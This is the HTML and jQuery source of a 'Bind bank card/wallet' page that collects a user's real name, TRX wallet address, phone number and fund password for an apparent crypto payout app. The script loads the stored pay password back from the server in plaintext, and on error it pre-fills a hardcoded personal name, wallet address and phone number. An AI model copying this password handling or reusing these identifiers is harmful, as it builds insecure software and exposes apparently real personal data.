<!DOCTYPE html>
<html lang="en" class="deeppurple-theme" style="cursor: url(&quot;img/touch.png&quot;), move;">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport"
        content="width=device-width, initial-scale=1, shrink-to-fit=no, viewport-fit=cover, user-scalable=no">
    <meta name="description" content="">
    <title>Bind bank card/wallet</title><!-- Material design icons CSS -->
    <link href="./Bind bank card_wallet_files/icon" rel="stylesheet"><!-- Roboto fonts CSS -->
    <link href="./Bind bank card_wallet_files/css" rel="stylesheet"><!-- Bootstrap core CSS -->
    <link href="./Bind bank card_wallet_files/bootstrap.min.css" rel="stylesheet"><!-- Swiper CSS -->
    <link href="./Bind bank card_wallet_files/swiper-bundle.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="./login_files/logo.png">
    <!-- Custom styles for this template -->
    <link href="./Bind bank card_wallet_files/style.css" rel="stylesheet">
    <link rel="stylesheet" href="./Bind bank card_wallet_files/public.css">
    <style>
        .document_id.float-label:not(.active) .form-control-label {
            left: 95px
        }
    </style>
    <link href="./Bind bank card_wallet_files/layer.css" type="text/css" rel="styleSheet" id="layermcss">
    <link href="./Bind bank card_wallet_files/layer.css" type="text/css" rel="styleSheet" id="layermcss">
</head>

<body><a href="javascript:void(0)" class="closesidemenu"><i class="material-icons icons-raised bg-dark ">close</i></a>
    <div class="wrapper homepage"><!-- header -->
        <div class="header bg-template" style="backdrop-filter:none">
            <div class="row no-gutters">
                <div class="col-auto"><a href=""
                        class="btn btn-link text-white"><i class="material-icons">chevron_left</i></a></div>
                <div class="col text-center"><button class="btn w-100 text-white">Bind bank card/wallet</button></div>
                <div class="col-auto"><a href=""
                        class="btn  btn-link text-white position-relative"><i
                            class="material-icons">support_agent</i></a></div>
            </div>
        </div><!-- header ends -->
        <div class="container">
            <form action=" id="login-form">
                <h6 class="subtitle">Your card/wallet information</h6>
                <div class="row"><!---->
                    <div class="col-12 col-md-6">
                        <div class="form-group float-label active"><select name="bank_code" class="form-control">
                                <option value="">select bank</option>
                                <option value="TRX" selected="">TRX Tron(TRC20)</option>
                            </select><label class="form-control-label">Bank/Wallet List</label></div>
                    </div>
                    <!----><!--<div class="col-12 col-md-6"><div class="form-group float-label "><input type="number"
                               class="form-control" required="" name="bank_branch" minlength="4" maxlength="4"  value=""><label class="form-control-label">Branch Code</label></div></div>--><!--<div class="col-12 col-md-6"><div class="form-group float-label active"><select name="bank_type" class="form-control"><option value="SAVINGS">SAVINGS</option><option value="CHECKING">CHECKING</option></select><label class="form-control-label">The type of beneficiary bank account.</label></div></div>--><!--<div class="col-12 col-md-6"><div class="form-group float-label "><input type="text" class="form-control" required="" name="account_digit" maxlength="2"  value=""><label class="form-control-label">account digit</label></div></div>-->
                    <div class="col-12 col-md-6">
                        <div class="form-group float-label active"><input type="text" class="acc-name form-control" required=""
                                name="user_name" maxlength="60" value=""><label class="form-control-label">Real
                                name</label></div>
                    </div><!---->
                    <div class="col-12 col-md-6">
                        <div class="form-group float-label active"><input type="text" class="acc-TRX form-control" required=""
                                name="id_number" maxlength="50" value=""><label
                                class="form-control-label">TRX code/bank account</label></div>
                    </div>
                    <div class="col-12 col-md-6">
                        <div class="form-group float-label active"><input type="tel" class="acc-tel form-control" required=""
                                name="tel" maxlength="20" value=""><label class="form-control-label">Contact
                                number</label></div>
                    </div>
                    <!----><!----><!--<div class="col-12 col-md-6"><div class="form-group float-label document_id  active"><div class="input-group"><div class="input-group-prepend"><select class="form-control" name="document_type"><option value="CPF">CPF</option><option value="CNPJ">CNPJ</option></select></div><input type="text" class="form-control" required="" name="document_id" maxlength="14" value=""></div><label class="form-control-label">Document ID</label></div></div>-->
                </div>
                <!--<h6 class="subtitle">Your card/wallet information</h6>--><!--<h6 class="subtitle">more information</h6>--><!--<div class="row"><div class="col-12 col-md-6"><div class="form-group float-label active"><input type="text" class="form-control" required="" name="qq" maxlength="60" value=""><label class="form-control-label">WhatsApp</label></div></div></div>-->
                <div class="row">
                    <div class="col-12 col-md-6">
                        <div class="form-group float-label active"><input type="password" class="acc-pwd form-control"
                                required="" name="paypassword" maxlength="60" value=""><label
                                class="form-control-label">Please enter the fund password</label></div>
                    </div>
                </div><span style="font-size: 12px;color: red;padding-left: 13px;display: block;">The default password
                    is the login password, which can be modified in the personal center</span><button
                    class="btn btn-lg btn-default text-white btn-block btn-rounded shadow mt-3 mb-2 save-btn">confirm
                    modification</button>
                <p class="text-mute small">Please enter correct information or payment will not arrive.</p>
            </form>
        </div>
    </div>
    <div class="notification shadow pt-0 pl-0 pr-0 border-0 bg-template-light">
        <div id="notification_countdown"></div>
        <div class="row pt-2 pl-3 pr-3">
            <div class="col-auto align-self-center pr-0"><i class="material-icons text-template md-36">redeem</i></div>
            <div class="col small notification-content">loading...</div>
            <div class="col-auto align-self-center pl-0"><button class="btn btn-link closenotification"><i
                        class="material-icons text-template md-18 ">close</i></button></div>
        </div>
    </div>
    <script type="text/javascript">var app = {
            'online_popup': "",
        }</script><!-- jquery, popper and bootstrap js -->
    <script src="./Bind bank card_wallet_files/jquery-3.3.1.min.js.download"></script>
    <script src="./Bind bank card_wallet_files/popper.min.js.download"></script>
    <script src="./Bind bank card_wallet_files/bootstrap.min.js.download"></script><!-- swiper js -->
    <script src="./Bind bank card_wallet_files/swiper-bundle.min.js.download"></script><!-- cookie js -->
    <script src="./Bind bank card_wallet_files/jquery.cookie.js.download"></script>
    <script charset="utf-8" src="./Bind bank card_wallet_files/dialog.min.js.download"></script>
    <link rel="stylesheet" href="./Bind bank card_wallet_files/layer(1).css">
    <script src="./Bind bank card_wallet_files/layer.js.download"></script>
    <script charset="utf-8" src="./Bind bank card_wallet_files/jquery.progressBarTimer.js.download"></script>
    <script charset="utf-8" src="./Bind bank card_wallet_files/common.js.download"></script><!-- template custom js -->
    <script src="./Bind bank card_wallet_files/main.js.download"></script>
    <script type="application/javascript">
        function isLoggedIn(){
            $.ajax({
                url: "../serve/is_user_logged_in.php",
                type: 'GET',
                success: function (data) {
                    data = JSON.parse(data)
                    if(!data.result){
                        window.location.replace('./login.html')
                    }
                },
            });
        }
        $(function () {
            isLoggedIn()
            setInterval(()=>{
                isLoggedIn()
            },10000)
        $.ajax({
            url: "../serve/get_wallet_info.php",
            type: 'GET',
            success: function (data) {
                data = JSON.parse(data)
                if(data && data.code == 0){
                    $(".acc-name").val(data.data.user_name)
                    $(".acc-tel").val(data.data.tel)
                    $(".acc-TRX").val(data.data.id_number)
                    $(".acc-pwd").val(data.data.paypassword)
                }
                else{
                    setTimeout(()=>{
                        $(document).dialog({ infoText: data.info });
                    },2500)
                    $(".acc-name").val('李安旭')
                    $(".acc-TRX").val('TJd6GmNT5GXwrqZBgUKyY22uuC9EJVtdCr')
                    $(".acc-tel").val('447440332932')
                }
            },
        });
            var bankname = "";
            if (bankname) {
                $('.bank-item').each(function () {
                    let that = this;
                    if ($(this).find('.dropdown-item-text').children().eq(0).text() == bankname) {
                        setTimeout(function () {
                            $(that).click();
                        },
                            150);
                    }
                })
            }
            $('.bank-item').click(function () {
                var span = $('.bank-select').find('span');
                span.html('');
                span.append($(this).find('.dropdown-item-icon').clone().css('height', '28px').css('width', '28px'));
                span.append(' ');
                var bankcode = $(this).find('.dropdown-item-text').children().eq(0).clone();
                span.append(bankcode);
                $("input[name=bankname]").val(bankcode.text());
            });

            /*检查表单*/
            function check() {
                if ($("input[name=user_name]").val() == '') {
                    $(document).dialog({
                        infoText: "cannot be empty!"
                    });
                    $("input[name=username]").focus();
                    return false;
                }
                if ($("input[name=tel]").is(":visible") && $("input[name=tel]").val() == '') {
                    $(document).dialog({
                        infoText: "cannot be empty!"
                    });
                    $("input[name=tel]").focus();
                    return false;
                }
                if ($("input[name=upi_id]").is(":visible") && $("input[name=upi_id]").val() == '') {
                    $(document).dialog({
                        infoText: "cannot be empty!"
                    });
                    $("input[name=upi_id]").focus();
                    return false;
                }
                if ($(".bankname").is(":visible") && $("input[name=bankname]").val() == '') {
                    $(document).dialog({
                        infoText: "cannot be empty!"
                    });
                    $("input[name=bankname]").focus();
                    return false;
                }
                if ($("input[name=site]").is(":visible")) {
                    if ($("input[name=site]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=site]").focus();
                        return false;
                    }
                }
                if ($("input[name=card]").is(":visible")) {
                    if ($("input[name=card]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=card]").focus();
                        return false;
                    }
                    var myreg = /^([0-9]){5,20}$/;
                    if (!myreg.test($("input[name=card]").val())) {
                        $(document).dialog({
                            infoText: 'cannot be empty!'
                        });
                        $("input[name=card]").focus();
                        return false;
                    }
                }
                if ($("input[name=account_digit]").is(":visible") && $("input[name=account_digit]").val() == '') {
                    $(document).dialog({
                        infoText: "cannot be empty!"
                    });
                    $("input[name=account_digit]").focus();
                    return false;
                }
                if ($("input[name=document_id]").is(":visible")) {
                    if ($("input[name=document_id]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=document_id]").focus();
                        return false;
                    }
                }
                if ($("input[name=paypassword]").is(":visible")) {
                    if ($("input[name=paypassword]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=paypassword]").focus();
                        return false;
                    }
                }
                if ($("input[name=wallet_document_id]").is(":visible")) {
                    if ($("input[name=wallet_document_id]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=wallet_document_id]").focus();
                        return false;
                    }
                }
                if ($("input[name=id_number]").is(":visible")) {
                    if ($("input[name=id_number]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=id_number]").focus();
                        return false;
                    }
                }
                if ($("select[name=bank_code]").is(":visible")) {
                    if ($("select[name=bank_code]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=bank_code]").focus();
                        return false;
                    }
                }
                if ($("input[name=bank_branch]").is(":visible")) {
                    if ($("input[name=bank_branch]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=bank_branch]").focus();
                        return false;
                    }
                }
                if ($("input[name=account_digit]").is(":visible")) {
                    if ($("input[name=account_digit]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=account_digit]").focus();
                        return false;
                    }
                }
                if ($("input[name=wallet_tel]").is(":visible")) {
                    if ($("input[name=wallet_tel]").val() == '') {
                        $(document).dialog({
                            infoText: "cannot be empty!"
                        });
                        $("input[name=wallet_tel]").focus();
                        return false;
                    }
                }
                if ($("input[name=ifsc]").is(":visible") && $("input[name=ifsc]").val() == '') {
                    $(document).dialog({
                        infoText: "cannot be empty!"
                    });
                    $("input[name=ifsc]").focus();
                    return false;
                }

                return true;
            }

            /*点击登录*/
            $(".save-btn").on('click',
                function () {
                    if (check()) {
                        var loading = null;
                        $.ajax({
                            url: '../serve/set_wallet_info.php',
                            data: {
                                id_number:$(".acc-TRX").val(),
                                tel:$(".acc-tel").val(),
                                username:$(".acc-name").val(),
                                paypassword:$(".acc-pwd").val()
                            },
                            type: 'POST',
                            beforeSend: function () {
                                loading = $(document).dialog({
                                    type: 'notice',
                                    infoIcon: '/static_new/img/loading.gif',
                                    infoText: 'loading...',
                                    autoClose: 0
                                });
                            },
                            success: function (data) {
                                data = JSON.parse(data)
                                loading.close();
                                if (data.code == 0) {
                                    console.log("From server",data.message)
                                    $(document).dialog({
                                        infoText: data.message,
                                        onClosed: function () {
                                            window.location.href = "./homepage.html";
                                        }
                                    });
                                } else {
                                    $(document).dialog({
                                        infoText: data.message
                                    });
                                }
                            }
                        });
                    }
                    return false;
                })
        })</script>
</body>

</html>